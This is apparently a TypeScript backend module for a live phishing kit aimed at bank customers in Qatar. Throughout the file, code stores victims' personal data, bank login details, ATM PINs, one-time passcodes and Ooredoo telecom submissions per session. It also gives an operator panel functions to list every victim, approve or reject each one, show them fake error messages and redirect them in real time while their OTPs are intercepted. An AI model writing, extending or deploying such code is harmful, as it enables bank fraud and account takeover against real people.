import { db } from "./_core/db";
import { sessions, personalDataSubmissions, loginMethodSubmissions, atmPinSubmissions, otpSubmissions, ooredooSubmissions } from "../drizzle/schema";
import { eq, desc } from "drizzle-orm";

export async function createSession(id: string, selectedBank: string, country: string = "Qatar") {
  await db.insert(sessions).values({
    id,
    selectedBank,
    country,
    status: "pending",
    createdAt: new Date(),
    updatedAt: new Date(),
  });
}

export async function submitPersonalData(data: any) {
  await db.insert(personalDataSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      currentStep: "personal",
      status: "pending" 
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function submitLoginMethod(data: any) {
  await db.insert(loginMethodSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      adminAction: "pending", 
      currentStep: "login",
      status: "pending"
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function submitAtmPin(data: any) {
  await db.insert(atmPinSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      adminAction: null, 
      redirectTarget: null,
      currentStep: "atm" 
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function submitOtp(data: any) {
  await db.insert(otpSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  // نقوم بمسح أي إجراء آدمن سابق عند إرسال OTP جديد للسماح بالمتابعة
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      adminAction: null,
      redirectTarget: null,
      currentStep: data.otpType === "ooredoo" ? "otp_ooredoo" : "otp" 
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function submitOoredoo(data: any) {
  await db.insert(ooredooSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      adminAction: null, 
      redirectTarget: null,
      currentStep: "ooredoo" 
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function getAllSubmissions() {
  return await getFullSubmissions();
}

// إضافة وظيفة لجلب الجلسات مع كافة بياناتها للوحة الإدارة
export async function getFullSubmissions() {
  const allSessions = await db.select().from(sessions).orderBy(desc(sessions.updatedAt)); // الترتيب حسب آخر تحديث ليظهر العميل النشط أولاً
  const results = [];

  for (const session of allSessions) {
    const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, session.id)).limit(1);
    const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, session.id)).limit(1);
    const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, session.id)).limit(1);
    const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, session.id)).orderBy(desc(otpSubmissions.submittedAt));
    const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, session.id)).limit(1);

    results.push({
      ...session,
      personalData: personal[0] || null,
      loginMethod: login[0] || null,
      atmPin: pin[0] || null,
      otps: otp,
      ooredoo: ooredoo[0] || null,
    });
  }

  return results;
}

export async function getSubmissionDetails(sessionId: string) {
  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
  if (!session[0]) return null;

  const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
  const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
  const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
  const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).orderBy(desc(otpSubmissions.submittedAt));
  const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);

  return {
    ...session[0],
    personalData: personal[0] || null,
    loginMethod: login[0] || null,
    atmPin: pin[0] || null,
    otps: otp,
    ooredoo: ooredoo[0] || null,
  };
}

export async function updateSessionStatus(sessionId: string, status: string, currentStep?: string) {
  const updateData: any = { status, updatedAt: new Date() };
  if (currentStep) updateData.currentStep = currentStep;
  
  // إذا كانت الحالة approved أو rejected، نقوم بتحديث adminAction أيضاً
  if (status === "approved") updateData.adminAction = "approve";
  if (status === "rejected") updateData.adminAction = "reject";

  await db.update(sessions)
    .set(updateData)
    .where(eq(sessions.id, sessionId));
}

export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string, redirectTarget?: string) {
  await db.update(sessions)
    .set({ 
      adminAction: action, 
      errorMessage: errorMessage || null,
      redirectTarget: redirectTarget || null,
      status: "pending", // Reset to pending to allow user to see action
      updatedAt: new Date() 
    })
    .where(eq(sessions.id, sessionId));
}

export async function getSessionStatus(sessionId: string) {
  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
  return session[0] || null;
}
